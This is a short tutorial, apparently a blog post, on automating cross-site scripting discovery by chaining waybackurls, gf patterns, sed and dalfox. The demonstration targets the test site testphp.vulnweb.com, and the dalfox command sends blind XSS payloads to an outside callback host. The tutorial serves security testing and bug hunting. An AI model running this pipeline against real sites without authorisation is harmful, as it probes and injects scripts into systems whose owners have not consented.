Hello Everyone! ðŸ˜„
Hope you all are good.
Automating Stuff is always fun so Why not XSS. All you need is "Go Lang" installed on your machine and you are ready to go.

## Pre-RequisitesÂ :
- GF by TomNomNom
- GF Patterns by Shiv Chouhan
- WayBackURLs by TomNomNom
- Dalfox by HAHWUL

## Workflow

- After Installation of all above mentioned tools, Choose your Target. Let's use "http://testphp.vulnweb.com/" for demonstration purposes.

- Use Waybackurls to fetch URL's for the chosen target and save the Output in a text file.

```bash
echo "testphp.vulnweb.com" | waybackurls | tee testphp.txt
```

- Use GF Patterns to find URLs that give you XSS and Use sed command to get our URLs ready for the Dalfox

```bash
cat test.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
```

- Time to fire Dalfox and start finding XSS.

    
```bash
dalfox file testxss.txt -b tigv2.xss.ht pipe
```

- Make sure you replace my Blind XSS Hunter Payload with that of yours.

## Automating Workflow usingÂ Bash

I have created a Bash Script to automate the above steps. Check it out.

## One Step Installation using Docker

Setting up all the tools and dependencies is a bit cumbersome. Use the Docker Image to do it in one step.

```bash
docker build --tag quickxss .
docker run -it --rm --name qs quickxss
```

Hope you liked it.

Thanks for reading. ðŸ˜„
